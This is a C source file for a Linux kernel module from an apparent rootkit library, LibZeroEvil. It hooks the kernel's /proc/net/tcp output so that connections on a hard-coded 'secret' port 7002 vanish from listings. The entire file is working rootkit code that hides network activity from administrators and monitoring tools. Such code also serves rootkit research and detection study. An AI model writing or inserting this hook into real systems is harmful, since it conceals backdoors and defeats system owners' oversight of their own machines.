// Copyright 2016 Gu Zhengxiong <rectigu@gmail.com>
//
// This file is part of LibZeroEvil.
//
// LibZeroEvil is free software:
// you can redistribute it and/or modify it
// under the terms of the GNU General Public License
// as published by the Free Software Foundation,
// either version 3 of the License,
// or (at your option) any later version.
//
// LibZeroEvil is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with LibZeroEvil.
// If not, see <http://www.gnu.org/licenses/>.


# ifndef CPP
# include <linux/module.h>
# include <linux/kernel.h>
# include <net/tcp.h> // struct tcp_seq_afinfo.
# endif // CPP

# include "zeroevil.h"


MODULE_LICENSE("GPL");

# define NET_ENTRY "/proc/net/tcp"
# define SEQ_AFINFO_STRUCT struct tcp_seq_afinfo
# define SECRET_PORT 7002
# define NEEDLE_LEN 6
# define TMPSZ 150

int
(*real_seq_show)(struct seq_file *seq, void *v);
int
fake_seq_show(struct seq_file *seq, void *v);


int
init_module(void)
{
    fm_alert("%s\n", "Greetings the World!");

    set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT,
                      fake_seq_show, real_seq_show);

    return 0;
}


void
cleanup_module(void)
{
    if (real_seq_show) {
        void *dummy;
        set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT,
                          real_seq_show, dummy);
    }

    fm_alert("%s\n", "Farewell the World!");
    return;
}


int
fake_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    char needle[NEEDLE_LEN];

    snprintf(needle, NEEDLE_LEN, ":%04X", SECRET_PORT);
    ret = real_seq_show(seq, v);

    if (strnstr(seq->buf + seq->count - TMPSZ, needle, TMPSZ)) {
        fm_alert("Hiding port %d using needle %s.\n",
                 SECRET_PORT, needle);
        seq->count -= TMPSZ;
    }

    return ret;
}
